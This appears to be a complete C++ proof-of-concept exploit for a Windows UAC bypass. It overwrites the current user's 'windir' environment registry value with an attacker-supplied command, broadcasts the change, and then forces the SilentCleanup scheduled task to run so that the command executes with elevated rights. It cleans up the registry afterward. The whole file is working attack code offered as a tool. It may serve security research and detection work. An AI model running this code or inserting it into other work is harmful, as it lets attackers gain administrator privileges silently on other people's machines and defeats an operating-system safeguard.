/* EnvSchtasksUACBypass.cpp : trinado's schtask environment handling UAC bypass, 
   overwrites the current users %WINDIR% with a quoted executable path to run with elevated rights.
*/
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <tchar.h>
#include <wchar.h>
#include <iostream>
#include <taskschd.h>
#include <winternl.h>
#define SECURITY_WIN32 1
#include <security.h>

// libs
#pragma comment(lib,"Taskschd.lib") 
#pragma comment(lib,"User32.lib")
#pragma comment(lib,"AdvApi32.lib")
#pragma comment(lib,"Ole32.lib")
#pragma comment(lib,"Oleaut32.lib")
#pragma comment(lib,"ntdll.lib") 
#pragma comment(lib,"Secur32.lib")

int main(int argc, char* argv[]) {
    LPWSTR pCMDpath;
    LPWSTR pCMD;
    size_t sSize;
    if (argc != 2) {
        printf("[!] Error, you must supply a command\n");
        return EXIT_FAILURE;
    }
    pCMDpath = new TCHAR[MAX_PATH + 1];
    mbstowcs_s(&sSize, pCMDpath, MAX_PATH, argv[1], MAX_PATH);
    pCMD = new TCHAR[MAX_PATH + 3];
    swprintf(pCMD, MAX_PATH + 3, L"\"%s\"", pCMDpath);
    DWORD dwRet;
    HRESULT hr_init, hr = E_FAIL;
    ITaskService* pService = NULL;
    ITaskFolder* pRootFolder = NULL;
    IRegisteredTask* pTask = NULL;
    IRunningTask* pRunningTask = NULL;
    VARIANT var;
    BSTR bstrTaskFolder = NULL;
    BSTR bstrTask = NULL;
    HKEY hUserSID = NULL;
    HKEY hRegKey = NULL;
    HANDLE hToken = NULL;
    DWORD dwErrorCode = 0;
    DWORD dwBufferSize = 0;
    PTOKEN_USER pTokenUser = NULL;
    UNICODE_STRING uStr;
    // Open the access token associated with the calling process.  
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken) == FALSE) {
        dwErrorCode = GetLastError();
        wprintf(L"OpenProcessToken failed. GetLastError returned: %d\n", dwErrorCode);
        return HRESULT_FROM_WIN32(dwErrorCode);
    }
    // Retrieve the token information in a TOKEN_USER structure.  
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize);
    pTokenUser = (PTOKEN_USER) new BYTE[dwBufferSize];
    memset(pTokenUser, 0, dwBufferSize);
    if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwBufferSize)) {
        CloseHandle(hToken);
    } 
    else {
        dwErrorCode = GetLastError();
        wprintf(L"GetTokenInformation failed. GetLastError returned: %d\n", dwErrorCode);
        return HRESULT_FROM_WIN32(dwErrorCode);
    }
    if (IsValidSid(pTokenUser->User.Sid) == FALSE) {
        wprintf(L"The owner SID is invalid.\n");
        delete[] pTokenUser;
        return -1;
    }
    RtlConvertSidToUnicodeString(&uStr, pTokenUser->User.Sid, true);
    // UNICODE_STRING isn't gaurenteed NULL terminated, possible bug here.
    dwRet = RegOpenKeyEx(HKEY_USERS, uStr.Buffer, 0, MAXIMUM_ALLOWED, &hUserSID);
    dwRet = RegOpenKeyExW(hUserSID, L"Environment", 0, MAXIMUM_ALLOWED, &hRegKey);
    if (dwRet != ERROR_SUCCESS) {
        printf("[-] RegOpenKeyEx Ret:%x\n", dwRet);
        return dwRet;
    }
    
    dwRet = RegSetValueExW(hRegKey,L"windir",0, REG_SZ, (BYTE*) pCMD,((DWORD)wcslen(pCMD)*2)+1);
    if (dwRet != ERROR_SUCCESS) {
        printf("[-] RegOpenKeyEx Ret:%x\n", dwRet);
        return dwRet;
    };
    // Updates the PEB.
    SendMessageTimeout(HWND_BROADCAST,WM_SETTINGCHANGE,0,(LPARAM)TEXT("windir"),SMTO_BLOCK,1000,NULL);
    // Use COM instance of Scheduled Task and trigger the exploit
    hr_init = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    do {
        bstrTaskFolder = SysAllocString(L"\\Microsoft\\Windows\\DiskCleanup");
        if (bstrTaskFolder == NULL)
            break;
        bstrTask = SysAllocString(L"SilentCleanup");
        if (bstrTask == NULL)
            break;
        hr = CoCreateInstance(CLSID_TaskScheduler,NULL,CLSCTX_INPROC_SERVER,IID_ITaskService,(void**)&pService);
        if (FAILED(hr))
            break;
        var.vt = VT_NULL;
        hr = pService->Connect(var, var, var, var);
        if (FAILED(hr))
            break;
        hr = pService->GetFolder(bstrTaskFolder, &pRootFolder);
        if (FAILED(hr))
            break;
        hr = pRootFolder->GetTask(bstrTask, &pTask);
        if (FAILED(hr))
            break;
        hr = pTask->RunEx(var, TASK_RUN_IGNORE_CONSTRAINTS, 0, NULL, &pRunningTask);
        if (FAILED(hr))
            break;
        printf("[+] DiskCleanup task executed succesfully!\n");
    } while (FALSE);
    /* Exploit cleanup here - free objects and COM service */
    if(pTokenUser) {
        delete[] pTokenUser;
    }
    if(hRegKey) {
        dwRet = RegDeleteKeyValue(hUserSID, L"Environment", L"windir");
        if (dwRet != ERROR_SUCCESS) {
            printf("[-] Error didn't cleanup environment RegOpenKeyEx Ret:%x\n", dwRet);
        };
    }
    if(bstrTaskFolder)
        SysFreeString(bstrTaskFolder);
    if (bstrTask)
        SysFreeString(bstrTask);
    if (pRunningTask) {
        pRunningTask->Stop();
        pRunningTask->Release();
    }
    if(pTask)
        pTask->Release();
    if(pRootFolder)
        pRootFolder->Release();
    if (pService)
        pService->Release();
    if (SUCCEEDED(hr_init))
        CoUninitialize();
    return SUCCEEDED(hr);
}
